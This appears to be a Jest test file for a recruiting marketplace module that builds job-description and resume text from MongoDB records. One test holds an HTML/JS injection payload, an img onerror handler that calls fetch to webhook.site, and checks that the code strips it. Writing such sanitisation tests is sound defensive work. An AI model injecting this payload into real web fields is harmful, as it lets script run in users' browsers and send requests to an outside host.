const { splitSkills, fmtExperience, composeJd, summarizeExperience, composeResume, loadContext } = require("../src/marketplace");
const { ObjectId } = require("mongodb");

test("splitSkills handles comma string, array, trailing periods", () => {
  expect(splitSkills("Java, SQL, Jenkins.")).toEqual(["Java", "SQL", "Jenkins"]);
  expect(splitSkills(["A", " B "])).toEqual(["A", "B"]);
  expect(splitSkills("")).toEqual([]);
  expect(splitSkills(undefined)).toEqual([]);
});

test("fmtExperience renders 'min max' as a range", () => {
  expect(fmtExperience("4 5")).toBe("4-5 years");
  expect(fmtExperience("18 years")).toBe("18 years");
  expect(fmtExperience("")).toBe("");
});

test("composeJd builds JD text from jobDetails", () => {
  const t = composeJd({ jobTitle: "Senior Dev", experience: "8 12", mustHaveSkills: ["C#", ".NET"], goodToHave: ["Azure"], shortDescription: "Build integrations." });
  expect(t).toContain("Job Title: Senior Dev");
  expect(t).toContain("Experience required: 8-12 years");
  expect(t).toContain("Must-have skills: C#, .NET");
  expect(t).toContain("Good-to-have skills: Azure");
  expect(t).toContain("Description: Build integrations.");
});

test("summarizeExperience handles array, object, and missing", () => {
  expect(summarizeExperience([{ designation: "SDET", companyName: "Acme", totalExperience: "5y" }], null)).toContain("SDET at Acme");
  expect(summarizeExperience({ totalExperience: "5+ years", designation: "QA", companyName: "Beta" }, null)).toContain("5+ years");
  expect(summarizeExperience(undefined, { Experience: "18 years" })).toBe("18 years");
  expect(summarizeExperience(undefined, null)).toBe("Not specified");
});

test("composeResume pulls name, SkillBlock fallback, experience", () => {
  const r = composeResume({
    personal_info: { firstName: "Ada", middleName: "", lastName: "Lovelace" },
    work_experience: { totalExperience: "5 years", designation: "Engineer", companyName: "Hiringhood" },
    completeResumeDetails: { parsed_resume: { ResumeParserData: { SkillBlock: "Python, SQL, AWS." } } },
  });
  expect(r.candidateName).toBe("Ada Lovelace");
  expect(r.candidateSkills).toEqual(["Python", "SQL", "AWS"]);
  expect(r.resumeText).toContain("Candidate: Ada Lovelace");
  expect(r.resumeText).toContain("Skills: Python, SQL, AWS");
});

test("HTML/JS injection in DB fields is stripped (no <img onerror>, no tags)", () => {
  const payload = '<img src=x onerror="fetch(\'https://webhook.site/x\')">';
  const jd = composeJd({ jobTitle: "Dev" + payload, mustHaveSkills: ["React", payload], shortDescription: "ok" + payload });
  expect(jd).not.toContain("<img");
  expect(jd).not.toContain("onerror");
  expect(splitSkills("React, " + payload + ", SQL")).not.toContain(payload);
  expect(splitSkills("React, " + payload + ", SQL").join(" ")).not.toContain("<img");
});

test("loadContext fetches contest + jobseeker and composes context", async () => {
  const cId = new ObjectId(), jId = new ObjectId();
  const db = {
    collection(name) {
      if (name === "contests") return { findOne: async (q) => (q.contestId ? { details: { jobDetails: { jobTitle: "Dev", mustHaveSkills: ["Python"], experience: "3 5" } } } : null) };
      if (name === "jobSeekerProfile") return { findOne: async () => ({ personal_info: { firstName: "Sam" }, completeResumeDetails: { parsed_resume: { ResumeParserData: { SkillBlock: "Python, Go" } } } }) };
      return { findOne: async () => null };
    },
  };
  const ctx = await loadContext(db, cId.toString(), jId.toString());
  expect(ctx.jobTitle).toBe("Dev");
  expect(ctx.skills).toEqual(["Python"]);
  expect(ctx.goodToHaveSkills).toEqual([]);
  expect(ctx.jdText).toContain("Job Title: Dev");
  expect(ctx.resumeText).toContain("Candidate: Sam");
  expect(ctx.candidateName).toBe("Sam");
});

test("loadContext also derives goodToHaveSkills when present", async () => {
  const cId = new ObjectId(), jId = new ObjectId();
  const db = {
    collection(name) {
      if (name === "contests") return { findOne: async (q) => (q.contestId ? { details: { jobDetails: {
        jobTitle: "Dev", mustHaveSkills: ["Python"], goodToHave: ["Docker", "Kubernetes"],
      } } } : null) };
      if (name === "jobSeekerProfile") return { findOne: async () => ({ personal_info: { firstName: "Sam" } }) };
      return { findOne: async () => null };
    },
  };
  const ctx = await loadContext(db, cId.toString(), jId.toString());
  expect(ctx.goodToHaveSkills).toEqual(["Docker", "Kubernetes"]);
});

test("loadContext throws CONTEST_NOT_FOUND / JOBSEEKER_NOT_FOUND / INVALID_*", async () => {
  const missing = { collection: () => ({ findOne: async () => null }) };
  await expect(loadContext(missing, new ObjectId().toString(), new ObjectId().toString())).rejects.toMatchObject({ code: "CONTEST_NOT_FOUND" });
  await expect(loadContext(missing, "not-an-oid", new ObjectId().toString())).rejects.toMatchObject({ code: "INVALID_CONTEST_ID" });

  const contestOnly = {
    collection(name) {
      if (name === "contests") return { findOne: async () => ({ details: { jobDetails: {} } }) };
      return { findOne: async () => null };
    },
  };
  await expect(loadContext(contestOnly, new ObjectId().toString(), new ObjectId().toString())).rejects.toMatchObject({ code: "JOBSEEKER_NOT_FOUND" });
});
